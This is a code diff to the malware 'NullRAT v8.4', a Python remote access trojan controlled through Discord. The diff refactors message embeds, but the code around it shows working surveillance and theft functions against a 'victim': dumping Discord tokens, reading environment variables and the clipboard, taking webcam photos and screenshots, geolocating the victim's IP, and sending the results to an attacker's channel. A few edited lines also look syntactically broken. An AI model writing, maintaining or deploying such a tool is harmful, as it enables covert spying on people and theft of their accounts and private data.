@@ -16,21 +16,18 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
-ip_addr = IP()
     
 @client.event
 async def on_ready():
-    embed = genEmbed(
+    embed = Embed(
         title = f"NullRAT v8.4 started on: **{ip_addr}**", 
         description = f"Currently present in: **{original_dir}**",
         timestamp = datetime.now()
-    )
-    embed.set_author(
+    ).set_author(
         name="NullCode1337", 
         url=r"http://nullcode1337.42web.io/", 
         icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
-    )
-    embed.set_footer(
+    ).set_footer(
         text = f"Startup time:"
     )
     await client.get_channel(notification_channel).send(embed=embed)
@@ -65,14 +62,9 @@ async def get_environment(ctx, victim: str, environment: str):
             return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
             
         await ctx.response.send_message(
-            embed = Embed(
-                title=f"Found environment variable", 
-                timestamp = datetime.now()
-            ).add_field(
+            embed = genEmbed( f"Found environment variable", datetime.now() ).add_field(
                 name="Value for "+environment+" is:", 
                 value="```"+value+"```"
-            ).set_footer(
-                text = "NullRAT"
             )
         )
 
@@ -91,10 +83,10 @@ async def geolocate(ctx, victim):
         if data["status"] != "success": 
             return await ctx.send("```Unable to get Geolocation Info!```")
             
-        embed = discord.Embed(
-            title="Geolocation Information\n(Powered by ip-api)", 
-            description=f"[Google Maps link](https://www.google.com/maps/search/google+map++{data['lat']},{data['lon']})",
-            timestamp=datetime.now()
+        embed = genEmbed(
+            "Geolocation Information\n(Powered by ip-api)", 
+            datetime.now(),
+            f"[Google Maps link](https://www.google.com/maps/search/google+map++{data['lat']},{data['lon']})"
         )
             
         embed.add_field( name="Country", value=f"{data['country']} ({data['countryCode']})" )
@@ -103,7 +95,6 @@ async def geolocate(ctx, victim):
         embed.add_field( name="Zip code", value=data["zip"]       )
         embed.add_field( name="ISP",      value=data["isp"]       )
         embed.add_field( name="Timezone", value=data["timezone"]  )
-        embed.set_footer(text = "NullRAT")
 
         await ctx.followup.send(embed=embed)
 
@@ -137,15 +128,8 @@ async def get_webcam(ctx, victim):
         )
         
         await ctx.followup.send(
-            embed=discord.Embed(
-                title="Image taken from webcam:", 
-                timestamp=datetime.now()
-            ).set_footer(
-                text="NullRAT"
-            ), 
-            file=discord.File(
-                nr_working + "\\image.png"
-            )
+            embed=genEmbed( "Image taken from webcam:", datetime.now() )
+            file=discord.File( nr_working + "\\image.png" )
         )
         time.sleep(2)
         os.remove(nr_working + "\\image.png")
@@ -171,12 +155,7 @@ async def get_systeminfo(ctx, victim):
             stdin=subprocess.PIPE
         )
         await ctx.followup.send(
-            embed=discord.Embed(
-                title="System Information:", 
-                timestamp=datetime.now()
-            ).set_footer(
-                text = "NullRAT"
-            ), 
+            embed=genEmbed( "System Information:", datetime.now() )
             file=discord.File(nr_working + "\\youtube.txt", filename="systeminfo.txt"), 
         )
         time.sleep(2)
@@ -194,18 +173,9 @@ async def get_screenshot(ctx, victim):
         await ctx.response.defer()
         
         with mss() as sct: 
-            sct.shot(
-                output=nr_working+"\\monitor.png"
-            )
+            sct.shot( output=nr_working+"\\monitor.png" )
         await ctx.followup.send(
-            embed=discord.Embed(
-                title="Screenshot of victim's PC:",
-                timestamp=datetime.now()
-            ).set_image(
-                file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png')
-            ).set_footer(
-                text = "NullRAT"
-            )
+            embed=genEmbed( "Screenshot of victim's PC:", datetime.now() ).set_image( file = discord.File(nr_working + "\\monitor.png", filename='Screenshot.png') )
         )
         time.sleep(2)
         os.remove(nr_working + "\\monitor.png")
@@ -224,9 +194,8 @@ async def get_clipboard(ctx, victim):
         outp = os.popen("powershell Get-Clipboard").read()
         if len(outp) > 1000:
             return await ctx.followup.send(f"```{outp}```")
-        embed = discord.Embed(title="Clipboard contents", timestamp=datetime.now())
+        embed = genEmbed( "Clipboard contents", datetime.now() )
         embed.add_field(name="Clipboard:", value=f"```{outp}```" if outp != "" else "No text in clipboard")
-        embed.set_footer(text="NullRAT")
         
         await ctx.followup.send(embed=embed)
 
@@ -246,13 +215,11 @@ async def get_rawtokens(ctx, victim):
             message += token + "\n"
         if len(message) >= 1000: 
             return await ctx.followup.send("```" + message + "```")
-        embed = discord.Embed(
-            title="Discord Tokens", timestamp=datetime.now()
-        ).add_field(
+        embed = genEmbed( "Discord Tokens", datetime.now() ).add_field(
             name="RAW Tokens:", 
             value=f"```{message.rstrip()}```"
         )
-        embed.set_footer(text="NullRAT")
+        
         await ctx.followup.send(embed=embed)
 
 
@@ -527,18 +494,25 @@ def IP():
     try: return requests.get("http://icanhazip.com/").text.rstrip()
     except: return "127.0.0.1"
 
+ip_addr = IP()
+
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
     except OSError: return False
 
-def genEmbed(title, description=None, timestamp):
-    embed = discord.Embed(
-        title=title, 
-        description=description,
-        timestamp=timestamp
-    ).set_footer(
-        text="NullRAT"
-    )
+def genEmbed(title, timestamp, description=None):
+    if description is None:
+        embed = discord.Embed(
+            title=title, 
+            timestamp=timestamp
+        )
+    else:
+        embed = discord.Embed(
+            title=title, 
+            description=description,
+            timestamp=timestamp
+        )
+    embed.set_footer( text="NullRAT" )
     return embed
 
 def find_token():
